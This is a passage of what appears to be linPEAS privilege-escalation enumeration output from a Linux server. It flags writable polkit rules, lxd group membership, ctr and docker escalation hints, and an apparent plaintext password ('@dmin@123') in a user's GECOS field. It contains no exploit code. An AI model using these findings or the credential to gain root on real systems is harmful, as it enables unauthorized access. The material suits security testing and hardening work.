         action.id === "org.freedesktop.bolt.manage") &&
        subject.active === true && subject.local === true &&
        subject.isInGroup("sudo")) {
            return polkit.Result.YES;
    }
});
WARNING: /usr/share/polkit-1/rules.d//org.freedesktop.fwupd.rules is writable!
polkit.addRule(function(action, subject) {
    if (action.id == "org.freedesktop.fwupd.update-internal" &&
        subject.active == true && subject.local == true &&
        subject.isInGroup("sudo")) {
            return polkit.Result.YES;
    }
});
WARNING: /usr/share/polkit-1/rules.d//org.freedesktop.packagekit.rules is writable!
polkit.addRule(function(action, subject) {
    if ((action.id == "org.freedesktop.packagekit.upgrade-system" ||
         action.id == "org.freedesktop.packagekit.trigger-offline-update") &&
        subject.active == true && subject.local == true &&
        subject.isInGroup("sudo")) {
            return polkit.Result.YES;
    }
});
WARNING: /usr/share/polkit-1/rules.d//systemd-networkd.rules is writable!
// This file is part of systemd.
// See systemd-networkd.service(8) and polkit(8) for more information.

// Allow systemd-networkd to set timezone, get product UUID,
// and transient hostname
polkit.addRule(function(action, subject) {
    if ((action.id == "org.freedesktop.hostname1.set-hostname" ||
         action.id == "org.freedesktop.hostname1.get-product-uuid" ||
         action.id == "org.freedesktop.timedate1.set-timezone") &&
        subject.user == "systemd-network") {
        return polkit.Result.YES;
    }
});

══╣ Polkit Authentication Agent
polkitd      857  0.0  0.1 308164  7680 ?        Ssl  Jul18   0:00 /usr/lib/polkit-1/polkitd --no-debug                                                                                                                                     

╔══════════╣ Superusers and UID 0 Users
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html                                                                                                                               
                                                                                                                                                                                                                                            
══╣ Users with UID 0 in /etc/passwd
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                                             

══╣ Users with sudo privileges in sudoers
root    ALL=(ALL:ALL) ALL                                                                                                                                                                                                                   
%admin ALL=(ALL) ALL
%sudo   ALL=(ALL:ALL) ALL
@includedir /etc/sudoers.d

╔══════════╣ Users with console
app-admin:x:1000:1000:@dmin@123:/home/app-admin:/bin/bash                                                                                                                                                                                   
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                                                                      
uid=1000(app-admin) gid=1000(app-admin) groups=1000(app-admin),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
uid=100(dhcpcd) gid=65534(nogroup) groups=65534(nogroup)
uid=101(messagebus) gid=102(messagebus) groups=102(messagebus)
uid=102(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=103(syslog) gid=104(syslog) groups=104(syslog),4(adm)
uid=104(uuidd) gid=105(uuidd) groups=105(uuidd)
uid=105(tcpdump) gid=107(tcpdump) groups=107(tcpdump)
uid=106(tss) gid=108(tss) groups=108(tss)
uid=107(landscape) gid=109(landscape) groups=109(landscape)
uid=108(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=109(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=42(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=989(fwupd-refresh) gid=989(fwupd-refresh) groups=989(fwupd-refresh)
uid=991(polkitd) gid=991(polkitd) groups=991(polkitd)
uid=992(systemd-resolve) gid=992(systemd-resolve) groups=992(systemd-resolve)
uid=997(systemd-timesync) gid=997(systemd-timesync) groups=997(systemd-timesync)
uid=998(systemd-network) gid=998(systemd-network) groups=998(systemd-network)
uid=999(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Currently Logged in Users
                                                                                                                                                                                                                                            
══╣ Basic user information
 09:22:44 up 16:32,  2 users,  load average: 0.19, 0.05, 0.01                                                                                                                                                                               
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
app-admi tty1     -                26May25 49days  0.06s  0.02s /bin/login -p --
app-admi          192.168.90.84    08:56    2:02m  0.00s  0.01s sshd: app-admin [priv]

══╣ Active sessions
 09:22:44 up 16:32,  2 users,  load average: 0.19, 0.05, 0.01                                                                                                                                                                               
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
app-admi tty1     -                26May25 49days  0.06s  0.02s /bin/login -p --
app-admi          192.168.90.84    08:56    2:02m  0.00s  0.01s sshd: app-admin [priv]

══╣ Logged in users (utmp)
           system boot  2025-05-26 13:32                                                                                                                                                                                                    
           run-level 5  2025-05-26 13:32
app-admin - tty1         2025-05-26 13:37  old         1859
app-admin + pts/0        2025-07-19 08:56 00:11       52548 (192.168.90.84)
app-admin + pts/1        2025-07-19 09:07 00:11       52802 (192.168.90.84)

══╣ SSH sessions
ESTAB    0      0      [::ffff:172.26.10.11]:22    [::ffff:192.168.90.84]:55006 users:(("sshd",pid=52650,fd=4),("sshd",pid=52548,fd=4))                                                                                                     

══╣ Screen sessions
No Sockets found in /run/screen/S-root.                                                                                                                                                                                                     


══╣ Tmux sessions
                                                                                                                                                                                                                                            
╔══════════╣ Last Logons and Login History
                                                                                                                                                                                                                                            
══╣ Last logins
app-admi pts/0        192.168.90.84    Sat Jul 19 08:56   still logged in                                                                                                                                                                   
reboot   system boot  6.8.0-60-generic Mon May 26 13:32   still running
reboot   system boot  6.8.0-60-generic Mon May 26 13:32   still running
reboot   system boot  6.8.0-60-generic Tue May 20 07:34 - 13:32 (6+05:57)
app-admi pts/1        192.168.90.2     Mon May 19 14:43 - 14:49  (00:05)
reboot   system boot  6.8.0-60-generic Mon May 19 12:26 - 13:32 (7+01:05)
app-admi pts/1        192.168.90.2     Mon May 19 07:04 - 07:05  (00:01)
app-admi pts/1        192.168.90.2     Mon May 19 07:03 - 07:04  (00:01)
app-admi pts/1        192.168.90.2     Mon May 19 06:58 - 07:02  (00:04)
app-admi pts/1        192.168.90.2     Mon May 19 06:58 - 06:58  (00:00)
app-admi pts/1        192.168.90.2     Mon May 19 06:54 - 06:57  (00:03)
app-admi pts/1        192.168.90.2     Mon May 12 14:57 - 14:59  (00:02)
app-admi pts/1        192.168.90.2     Mon May 12 10:51 - 10:51  (00:00)
reboot   system boot  6.8.0-59-generic Mon May 12 07:41 - 11:59 (7+04:17)
app-admi pts/1        192.168.90.2     Fri May  2 12:42 - 14:56  (02:13)
reboot   system boot  6.8.0-58-generic Fri May  2 11:27 - 07:40 (9+20:13)
reboot   system boot  6.8.0-53-generic Thu May  1 10:53 - 07:40 (10+20:47)
reboot   system boot  6.8.0-53-generic Thu May  1 10:31 - 07:40 (10+21:09)

wtmp begins Thu May  1 10:31:29 2025

══╣ Failed login attempts
                                                                                                                                                                                                                                            
btmp begins Sat Jul 19 07:20:10 2025

══╣ Recent logins from auth.log (limit 20)
2025-07-19T08:56:41.502154+00:00 app-server sshd[52548]: Accepted password for app-admin from 192.168.90.84 port 55006 ssh2                                                                                                                 
2025-07-19T08:56:41.507558+00:00 app-server systemd-logind[904]: New session 150 of user app-admin.
2025-07-19T09:22:44.123880+00:00 app-server nologin: Attempted login by app-admin (UID: 0) on UNKNOWN

══╣ Last time logon each user
Username         Port     From                                       Latest                                                                                                                                                                 
app-admin        pts/0    192.168.90.84                             Sat Jul 19 08:56:42 +0000 2025

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)
                                                                                                                                                                                                                                            
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                                                                                                            


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                                                                                                          
                             ╚══════════════════════╝                                                                                                                                                                                       
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                                                                                                             
/usr/bin/ctr
/usr/bin/curl
/usr/bin/docker
/usr/bin/g++
/usr/bin/gcc
/usr/sbin/lxc
/usr/bin/make
/usr/bin/nc
/usr/bin/netcat
/usr/bin/perl
/usr/bin/php
/usr/bin/ping
/usr/bin/python3
/usr/sbin/runc
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  g++                                              4:13.2.0-7ubuntu1                       amd64        GNU C++ compiler                                                                                                                  
ii  g++-13                                           13.3.0-6ubuntu2~24.04                   amd64        GNU C++ compiler
ii  g++-13-x86-64-linux-gnu                          13.3.0-6ubuntu2~24.04                   amd64        GNU C++ compiler for x86_64-linux-gnu architecture
ii  g++-x86-64-linux-gnu                             4:13.2.0-7ubuntu1                       amd64        GNU C++ compiler for the amd64 architecture
ii  gcc                                              4:13.2.0-7ubuntu1                       amd64        GNU C compiler
ii  gcc-13                                           13.3.0-6ubuntu2~24.04                   amd64        GNU C compiler
ii  gcc-13-x86-64-linux-gnu                          13.3.0-6ubuntu2~24.04                   amd64        GNU C compiler for the x86_64-linux-gnu architecture
ii  gcc-x86-64-linux-gnu                             4:13.2.0-7ubuntu1                       amd64        GNU C compiler for the amd64 architecture
ii  rpcsvc-proto                                     1.4.2-0ubuntu7                          amd64        RPC protocol compiler and definitions
/usr/bin/gcc

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: apache2 Not Found                                                                                                                                                                                                           
httpd Not Found                                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
Nginx version: nginx Not Found
                                                                                                                                                                                                                                            
══╣ PHP exec extensions
                                                                                                                                                                                                                                            

-rw-r--r-- 1 root root 73714 Mar 19 10:08 /etc/php/8.3/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 73718 Mar 19 10:08 /etc/php/8.3/phpdbg/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Checking if containerd(ctr) is available
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#containerd-ctr-privilege-escalation                                                                                                                       
ctr was found in /usr/bin/ctr, you may be able to escalate privileges with it                                                                                                                                                               
REF TYPE DIGEST SIZE PLATFORMS LABELS 

╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/index.html#docker-breakout--privilege-escalation                                                                                                     
lrwxrwxrwx 1 root root 37 May  1 11:10 /etc/systemd/system/sockets.target.wants/docker.socket -> /usr/lib/systemd/system/docker.socket                                                                                                      
-rw-r--r-- 1 root root 110 May  2 11:38 /root/app2/Dockerfile
-rw-r--r-- 1 root root 873 May 12 08:28 /root/hot/hothost-agent/Dockerfile
-rw-r--r-- 1 root root 342 May 12 08:28 /root/hot/server/Dockerfile
-rw-r--r-- 1 root root 171 Oct 11  2024 /usr/lib/systemd/system/docker.socket
-rw-r--r-- 1 root root 342 May 12 08:28 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f/merged/code/Dockerfile
-rw-r--r-- 1 root root 342 May  1 14:21 /var/lib/docker/overlay2/3f19d8b770900fd57481ce3b02e6c498ea4c62389034c9504a8b4184606d22f5/diff/code/Dockerfile
-rw-r--r-- 1 root root 342 May 12 08:28 /var/lib/docker/overlay2/4a4d31110fb5905c6a95a3d1de60b0cc5b3b750cb1f44bf7e5cacd4152837efe/diff/code/Dockerfile
-rw-r--r-- 1 root root 342 May  1 14:21 /var/lib/docker/overlay2/640a55178151e356a36ddb1038ca10d13eac581758b43471b4ad714454213420/diff/code/Dockerfile
-rw-r--r-- 1 root root 342 May  1 14:21 /var/lib/docker/overlay2/a3bbb16e998c836ec80d06ec8087a8e0496775c43901d831cdd4d9d41fb1592b/diff/code/Dockerfile
-rw-r--r-- 1 root root 342 May 12 08:28 /var/lib/docker/overlay2/aabe8df58c072125e8e8b12dca33e6be6a64a7e4d349149b9df7f355e44fe686/diff/code/Dockerfile
-rw-r--r-- 1 root root 342 May 12 08:28 /var/lib/docker/overlay2/c0517dc9db7deebcc00a82014f5cd300aaa9083d6d46faad115fd0caad9808f8/diff/code/Dockerfile
-rw-r--r-- 1 root root 342 May  1 14:21 /var/lib/docker/overlay2/f1598f61dabd938622c9e8c662f283e90b5dc4a9ce31d28d21ba906c8618db8b/diff/code/Dockerfile
-rw-r--r-- 1 root root 342 May 12 08:28 /var/lib/docker/overlay2/f55e68bea12ccbeb5f6350f70574c58e479efb0634d8b0e9566a8922c328b2b8/diff/code/Dockerfile
-rw-r--r-- 1 root root 0 May  1 11:10 /var/lib/systemd/deb-systemd-helper-enabled/sockets.target.wants/docker.socket

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Feb 16 21:04 /usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                                                          
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 May 15 06:01 /etc/pam.d                                                                                                                                                                                         
-rw-r--r-- 1 root root 2133 Apr 22 11:51 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                                                                                                        
drwxr-xr-x 2 root root 4096 Feb 16 20:57 /etc/ldap


╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3718 Dec  2  2024 /etc/cloud/cloud.cfg                                                                                                                                                                               
    lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Mar 31  2024 /etc/apt/keyrings                                                                                                                                                                                  
drwxr-xr-x 2 root root 4096 Feb 16 21:04 /usr/share/keyrings
drwxr-xr-x 2 root root 4096 May 25  2023 /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/etc/apt/keyrings
drwxr-xr-x 2 root root 4096 Oct 16  2024 /var/lib/docker/overlay2/1e28b8eb8bd713fa989ccaf75f0fd8b5cfd3a531beffdf1e2bd5fd395e093df2/diff/usr/share/keyrings
drwxr-xr-x 2 root root 4096 May 25  2023 /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/etc/apt/keyrings
drwxr-xr-x 2 root root 4096 Apr 28 00:00 /var/lib/docker/overlay2/62443586f3dde6ea31f8e3b42f525286cce61e287cc8646e66fc85d7020dfc7a/diff/usr/share/keyrings
drwxr-xr-x 2 root root 4096 May 25  2023 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/etc/apt/keyrings
drwxr-xr-x 2 root root 4096 Apr 28 00:00 /var/lib/docker/overlay2/fca178eec2676b7c701435e9569379d4f6c4da844fb3da4fcec8b32cb3b09efa/merged/usr/share/keyrings




╔══════════╣ Analyzing Cache Vi Files (limit 70)
                                                                                                                                                                                                                                            
-rw------- 1 root root 1468 Jul 19 09:07 /root/.viminfo

╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 761 Feb 16 21:04 /usr/share/bash-completion/completions/postfix                                                                                                                                                      


╔══════════╣ Analyzing Github Files (limit 70)
drwxr-xr-x 2 root root 4096 May 12 08:40 /root/hot/server/frontend/node_modules/balanced-match/.github                                                                                                                                      
drwxr-xr-x 3 root root 4096 May 12 08:40 /root/hot/server/frontend/node_modules/broadcast-channel/.github
drwxr-xr-x 3 root root 4096 May 12 08:40 /root/hot/server/frontend/node_modules/commitizen/.github
drwxr-xr-x 3 root root 4096 May 12 08:40 /root/hot/server/frontend/node_modules/fastq/.github
drwxr-xr-x 3 root root 4096 May 12 08:40 /root/hot/server/frontend/node_modules/flowbite/.github
drwxr-xr-x 3 root root 4096 May 12 08:40 /root/hot/server/frontend/node_modules/json-schema-traverse/.github
drwxr-xr-x 3 root root 4096 May 12 08:40 /root/hot/server/frontend/node_modules/oblivious-set/.github
drwxr-xr-x 2 root root 4096 May 12 08:40 /root/hot/server/frontend/node_modules/resolve/.github
drwxr-xr-x 2 root root 4096 May 12 08:40 /root/hot/server/frontend/node_modules/supports-preserve-symlinks-flag/.github
drwxr-xr-x 4 root root 4096 May 12 08:40 /root/hot/server/frontend/node_modules/@tailwindcss/forms/.github
drwxr-xr-x 2 root root 4096 May 12 09:37 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f/merged/code/node_modules/balanced-match/.github
drwxr-xr-x 2 root root 4096 May 12 09:37 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f/merged/code/node_modules/call-bind/.github
drwxr-xr-x 3 root root 4096 May 12 09:37 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f/merged/code/node_modules/express-handlebars/.github
drwxr-xr-x 2 root root 4096 May 12 09:37 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f/merged/code/node_modules/get-intrinsic/.github
drwxr-xr-x 2 root root 4096 May 12 09:37 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f/merged/code/node_modules/glob/node_modules/brace-expansion/.github
drwxr-xr-x 2 root root 4096 May 12 09:37 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f/merged/code/node_modules/has-symbols/.github
drwxr-xr-x 2 root root 4096 May 12 09:37 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f/merged/code/node_modules/object-inspect/.github
drwxr-xr-x 2 root root 4096 May 12 09:37 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f/merged/code/node_modules/qs/.github
drwxr-xr-x 3 root root 4096 May 12 09:37 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f/merged/code/node_modules/rss-parser/.github
drwxr-xr-x 2 root root 4096 May 12 09:37 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f/merged/code/node_modules/side-channel/.github
drwxr-xr-x 3 root root 4096 May 12 09:37 /var/lib/docker/overlay2/01fcf23de1a6d284725263a2478304bcd6d0be71b2c7b5fc291cf235f46a192f/merged/code/node_modules/undefsafe/.github
drwxr-xr-x 2 root root 4096 May  1 15:19 /var/lib/docker/overlay2/1d937d8a0e70ad59eb999eadff802cdd18971b6b5216675f6b282a2b7e4eb463/diff/code/node_modules/balanced-match/.github
drwxr-xr-x 2 root root 4096 May  1 15:19 /var/lib/docker/overlay2/1d937d8a0e70ad59eb999eadff802cdd18971b6b5216675f6b282a2b7e4eb463/diff/code/node_modules/call-bind/.github
drwxr-xr-x 3 root root 4096 May  1 15:19 /var/lib/docker/overlay2/1d937d8a0e70ad59eb999eadff802cdd18971b6b5216675f6b282a2b7e4eb463/diff/code/node_modules/express-handlebars/.github
drwxr-xr-x 2 root root 4096 May  1 15:19 /var/lib/docker/overlay2/1d937d8a0e70ad59eb999eadff802cdd18971b6b5216675f6b282a2b7e4eb463/diff/code/node_modules/get-intrinsic/.github
drwxr-xr-x 2 root root 4096 May  1 15:19 /var/lib/docker/overlay2/1d937d8a0e70ad59eb999eadff802cdd18971b6b5216675f6b282a2b7e4eb463/diff/code/node_modules/glob/node_modules/brace-expansion/.github
drwxr-xr-x 2 root root 4096 May  1 15:19 /var/lib/docker/overlay2/1d937d8a0e70ad59eb999eadff802cdd18971b6b5216675f6b282a2b7e4eb463/diff/code/node_modules/has-symbols/.github
drwxr-xr-x 2 root root 4096 May  1 15:19 /var/lib/docker/overlay2/1d937d8a0e70ad59eb999eadff802cdd18971b6b5216675f6b282a2b7e4eb463/diff/code/node_modules/object-inspect/.github
drwxr-xr-x 2 root root 4096 May  1 15:19 /var/lib/docker/overlay2/1d937d8a0e70ad59eb999eadff802cdd18971b6b5216675f6b282a2b7e4eb463/diff/code/node_modules/qs/.github
drwxr-xr-x 3 root root 4096 May  1 15:19 /var/lib/docker/overlay2/1d937d8a0e70ad59eb999eadff802cdd18971b6b5216675f6b282a2b7e4eb463/diff/code/node_modules/rss-parser/.github
drwxr-xr-x 2 root root 4096 May  1 15:19 /var/lib/docker/overlay2/1d937d8a0e70ad59eb999eadff802cdd18971b6b5216675f6b282a2b7e4eb463/diff/code/node_modules/side-channel/.github
drwxr-xr-x 3 root root 4096 May  1 15:19 /var/lib/docker/overlay2/1d937d8a0e70ad59eb999eadff802cdd18971b6b5216675f6b282a2b7e4eb463/diff/code/node_modules/undefsafe/.github
drwxr-xr-x 2 root root 4096 May 12 09:06 /var/lib/docker/overlay2/1db60beb9beda87d9aa9fe9e8099cb7aee7f133a0f68cfc88f2e06fbca2ba45e/diff/code/node_modules/balanced-match/.github
drwxr-xr-x 2 root root 4096 May 12 09:06 /var/lib/docker/overlay2/1db60beb9beda87d9aa9fe9e8099cb7aee7f133a0f68cfc88f2e06fbca2ba45e/diff/code/node_modules/call-bind/.github
drwxr-xr-x 3 root root 4096 May 12 09:06 /var/lib/docker/overlay2/1db60beb9beda87d9aa9fe9e8099cb7aee7f133a0f68cfc88f2e06fbca2ba45e/diff/code/node_modules/express-handlebars/.github
drwxr-xr-x 2 root root 4096 May 12 09:06 /var/lib/docker/overlay2/1db60beb9beda87d9aa9fe9e8099cb7aee7f133a0f68cfc88f2e06fbca2ba45e/diff/code/node_modules/get-intrinsic/.github
drwxr-xr-x 2 root root 4096 May 12 09:06 /var/lib/docker/overlay2/1db60beb9beda87d9aa9fe9e8099cb7aee7f133a0f68cfc88f2e06fbca2ba45e/diff/code/node_modules/glob/node_modules/brace-expansion/.github
drwxr-xr-x 2 root root 4096 May 12 09:06 /var/lib/docker/overlay2/1db60beb9beda87d9aa9fe9e8099cb7aee7f133a0f68cfc88f2e06fbca2ba45e/diff/code/node_modules/has-symbols/.github
drwxr-xr-x 2 root root 4096 May 12 09:06 /var/lib/docker/overlay2/1db60beb9beda87d9aa9fe9e8099cb7aee7f133a0f68cfc88f2e06fbca2ba45e/diff/code/node_modules/object-inspect/.github
drwxr-xr-x 2 root root 4096 May 12 09:06 /var/lib/docker/overlay2/1db60beb9beda87d9aa9fe9e8099cb7aee7f133a0f68cfc88f2e06fbca2ba45e/diff/code/node_modules/qs/.github
drwxr-xr-x 3 root root 4096 May 12 09:06 /var/lib/docker/overlay2/1db60beb9beda87d9aa9fe9e8099cb7aee7f133a0f68cfc88f2e06fbca2ba45e/diff/code/node_modules/rss-parser/.github
drwxr-xr-x 2 root root 4096 May 12 09:06 /var/lib/docker/overlay2/1db60beb9beda87d9aa9fe9e8099cb7aee7f133a0f68cfc88f2e06fbca2ba45e/diff/code/node_modules/side-channel/.github
drwxr-xr-x 3 root root 4096 May 12 09:06 /var/lib/docker/overlay2/1db60beb9beda87d9aa9fe9e8099cb7aee7f133a0f68cfc88f2e06fbca2ba45e/diff/code/node_modules/undefsafe/.github
drwxr-xr-x 2 root root 4096 May 12 09:37 /var/lib/docker/overlay2/2f400f5fa0a16561b0495a4fe049d04f2f5bd76951e7e77efe4f0acc6bbbd963/diff/code/node_modules/balanced-match/.github
drwxr-xr-x 2 root root 4096 May 12 09:37 /var/lib/docker/overlay2/2f400f5fa0a16561b0495a4fe049d04f2f5bd76951e7e77efe4f0acc6bbbd963/diff/code/node_modules/call-bind/.github
drwxr-xr-x 3 root root 4096 May 12 09:37 /var/lib/docker/overlay2/2f400f5fa0a16561b0495a4fe049d04f2f5bd76951e7e77efe4f0acc6bbbd963/diff/code/node_modules/express-handlebars/.github
drwxr-xr-x 2 root root 4096 May 12 09:37 /var/lib/docker/overlay2/2f400f5fa0a16561b0495a4fe049d04f2f5bd76951e7e77efe4f0acc6bbbd963/diff/code/node_modules/get-intrinsic/.github
drwxr-xr-x 2 root root 4096 May 12 09:37 /var/lib/docker/overlay2/2f400f5fa0a16561b0495a4fe049d04f2f5bd76951e7e77efe4f0acc6bbbd963/diff/code/node_modules/glob/node_modules/brace-expansion/.github
drwxr-xr-x 2 root root 4096 May 12 09:37 /var/lib/docker/overlay2/2f400f5fa0a16561b0495a4fe049d04f2f5bd76951e7e77efe4f0acc6bbbd963/diff/code/node_modules/has-symbols/.github
drwxr-xr-x 2 root root 4096 May 12 09:37 /var/lib/docker/overlay2/2f400f5fa0a16561b0495a4fe049d04f2f5bd76951e7e77efe4f0acc6bbbd963/diff/code/node_modules/object-inspect/.github
drwxr-xr-x 2 root root 4096 May 12 09:37 /var/lib/docker/overlay2/2f400f5fa0a16561b0495a4fe049d04f2f5bd76951e7e77efe4f0acc6bbbd963/diff/code/node_modules/qs/.github
drwxr-xr-x 3 root root 4096 May 12 09:37 /var/lib/docker/overlay2/2f400f5fa0a16561b0495a4fe049d04f2f5bd76951e7e77efe4f0acc6bbbd963/diff/code/node_modules/rss-parser/.github
drwxr-xr-x 2 root root 4096 May 12 09:37 /var/lib/docker/overlay2/2f400f5fa0a16561b0495a4fe049d04f2f5bd76951e7e77efe4f0acc6bbbd963/diff/code/node_modules/side-channel/.github
drwxr-xr-x 3 root root 4096 May 12 09:37 /var/lib/docker/overlay2/2f400f5fa0a16561b0495a4fe049d04f2f5bd76951e7e77efe4f0acc6bbbd963/diff/code/node_modules/undefsafe/.github
drwxr-xr-x 2 root root 4096 May  1 15:13 /var/lib/docker/overlay2/5834a5066fb7f0de3c0d609e7e388dc218abcafbbee9ac9171b06cb4e42663e5/diff/code/node_modules/balanced-match/.github
drwxr-xr-x 2 root root 4096 May  1 15:13 /var/lib/docker/overlay2/5834a5066fb7f0de3c0d609e7e388dc218abcafbbee9ac9171b06cb4e42663e5/diff/code/node_modules/call-bind/.github
drwxr-xr-x 3 root root 4096 May  1 15:13 /var/lib/docker/overlay2/5834a5066fb7f0de3c0d609e7e388dc218abcafbbee9ac9171b06cb4e42663e5/diff/code/node_modules/express-handlebars/.github
drwxr-xr-x 2 root root 4096 May  1 15:13 /var/lib/docker/overlay2/5834a5066fb7f0de3c0d609e7e388dc218abcafbbee9ac9171b06cb4e42663e5/diff/code/node_modules/get-intrinsic/.github
drwxr-xr-x 2 root root 4096 May  1 15:13 /var/lib/docker/overlay2/5834a5066fb7f0de3c0d609e7e388dc218abcafbbee9ac9171b06cb4e42663e5/diff/code/node_modules/glob/node_modules/brace-expansion/.github
drwxr-xr-x 2 root root 4096 May  1 15:13 /var/lib/docker/overlay2/5834a5066fb7f0de3c0d609e7e388dc218abcafbbee9ac9171b06cb4e42663e5/diff/code/node_modules/has-symbols/.github
drwxr-xr-x 2 root root 4096 May  1 15:13 /var/lib/docker/overlay2/5834a5066fb7f0de3c0d609e7e388dc218abcafbbee9ac9171b06cb4e42663e5/diff/code/node_modules/object-inspect/.github
drwxr-xr-x 2 root root 4096 May  1 15:13 /var/lib/docker/overlay2/5834a5066fb7f0de3c0d609e7e388dc218abcafbbee9ac9171b06cb4e42663e5/diff/code/node_modules/qs/.github
drwxr-xr-x 3 root root 4096 May  1 15:13 /var/lib/docker/overlay2/5834a5066fb7f0de3c0d609e7e388dc218abcafbbee9ac9171b06cb4e42663e5/diff/code/node_modules/rss-parser/.github
drwxr-xr-x 2 root root 4096 May  1 15:13 /var/lib/docker/overlay2/5834a5066fb7f0de3c0d609e7e388dc218abcafbbee9ac9171b06cb4e42663e5/diff/code/node_modules/side-channel/.github
drwxr-xr-x 3 root root 4096 May  1 15:13 /var/lib/docker/overlay2/5834a5066fb7f0de3c0d609e7e388dc218abcafbbee9ac9171b06cb4e42663e5/diff/code/node_modules/undefsafe/.github
drwxr-xr-x 2 root root 4096 May  1 14:32 /var/lib/docker/overlay2/6ac2995afbd0079e50c81993166be79f92e2e0e9351650aa484c963b36904ba3/diff/code/node_modules/balanced-match/.github
drwxr-xr-x 2 root root 4096 May  1 14:32 /var/lib/docker/overlay2/6ac2995afbd0079e50c81993166be79f92e2e0e9351650aa484c963b36904ba3/diff/code/node_modules/call-bind/.github
